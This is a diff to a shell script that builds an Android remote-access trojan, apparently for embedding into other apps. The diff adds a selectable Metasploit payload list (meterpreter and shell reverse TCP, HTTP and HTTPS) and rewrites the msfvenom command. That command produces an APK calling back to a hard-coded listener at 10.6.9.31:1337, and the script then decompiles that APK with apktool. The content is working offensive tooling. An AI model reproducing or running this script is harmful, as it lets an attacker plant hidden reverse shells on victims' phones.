@@ -12,6 +12,12 @@
 MSFVENOM=msfvenom
 LHOST="10.6.9.31"
 LPORT="1337"
+#PAYLOAD="android/meterpreter/reverse_http"
+#PAYLOAD="android/meterpreter/reverse_https"
+PAYLOAD="android/meterpreter/reverse_tcp"
+#PAYLOAD="android/shell/reverse_http"
+#PAYLOAD="android/shell/reverse_https"
+#PAYLOAD="android/shell/reverse_tcp"
 DEX2JAR=d2j-dex2jar
 UNZIP=unzip
 KEYTOOL=keytool
@@ -78,15 +84,15 @@ function init {
 # kick things off
 init
 
-echo -n "[*] Generating reverse tcp meterpreter payload..."
-$MSFVENOM -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
+echo -n "[*] Generating $PAYLOAD payload..."
+$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
 rc=$?
 echo "done."
 if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
   echo "[!] Failed to generate RAT APK file"
   exit 1
 fi
-echo "[+] Handle the meterpreter connection at: $LHOST:$LPORT"
+echo "[+] Handle the reverse connection at: $LHOST:$LPORT"
 
 echo -n "[*] Decompiling RAT APK file..."
 $APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
